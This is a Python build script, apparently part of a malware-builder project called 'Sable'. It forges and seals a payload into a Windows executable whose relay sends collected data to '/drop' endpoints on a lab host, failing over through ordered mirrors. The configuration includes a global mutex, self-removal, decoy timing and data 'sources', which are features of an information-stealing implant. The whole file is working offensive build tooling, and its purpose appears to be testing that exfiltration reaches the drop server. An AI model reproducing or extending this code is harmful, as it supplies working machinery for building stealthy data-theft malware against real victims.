"""Build an artifact whose delivery chain has to fail over to arrive.

Primary is a receiver that answers 500 on purpose, the first mirror is a closed port, and
the second mirror is the live box. A run that lands there did it after a real refusal and
a real connection error, in that order, which is what "ordered mirror failover" means.

    python mirror_build.py _out/live/SableRuntime.exe
"""

from __future__ import annotations

import sys
from pathlib import Path

HERE = Path(__file__).resolve().parent
ROOT = HERE.parent / "sable"
sys.path.insert(0, str(ROOT))

from core import forge, seal  # noqa: E402
from core.schema import (  # noqa: E402
    RelayConfig,
    RelayTarget,
    RunConfig,
    SCHEMA_VERSION,
    SourceConfig,
)

STUB = ROOT / "tools" / "dist" / "sable-launcher.exe"
SEAL_KEY = "bench-laptop-v1"

HOST = "192.168.1.151"
REFUSER = f"http://{HOST}:8097/drop"     # reachable, answers 500
DEAD = f"http://{HOST}:8096/drop"        # nothing listening
LIVE = f"http://{HOST}:8098/drop"        # where it has to end up

DESTINATION = Path(sys.argv[1] if len(sys.argv) > 1 else HERE / "_out" / "live" / "SableRuntime.exe")


def main() -> int:
    cfg = RunConfig(
        schema_version=SCHEMA_VERSION,
        mutex=r"Global\SableMirrorAudit",
        seal_key=SEAL_KEY,
        relay=RelayConfig(
            kind="https",
            endpoint=REFUSER,
            targets=(RelayTarget(kind="https", endpoint=DEAD), RelayTarget(kind="https", endpoint=LIVE)),
        ),
        sources=SourceConfig(),
        self_remove=True,
        ballast_mb=0,
        keep_local=False,
        persist=False,
        decoy_seconds=0,
    )

    archive = forge.payload(ROOT, cfg)
    sealed = seal.seal(archive, cfg.seal_key)
    if not STUB.is_file():
        raise SystemExit(f"stub missing: {STUB}")
    DESTINATION.parent.mkdir(parents=True, exist_ok=True)
    forge.build(cfg, sealed, DESTINATION, mode="exe", stub=STUB)

    print(f"artifact   {DESTINATION}  {DESTINATION.stat().st_size:,} bytes")
    print(f"primary    {REFUSER}   (answers 500)")
    print(f"mirror 1   {DEAD}   (closed)")
    print(f"mirror 2   {LIVE}   (accepts)")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
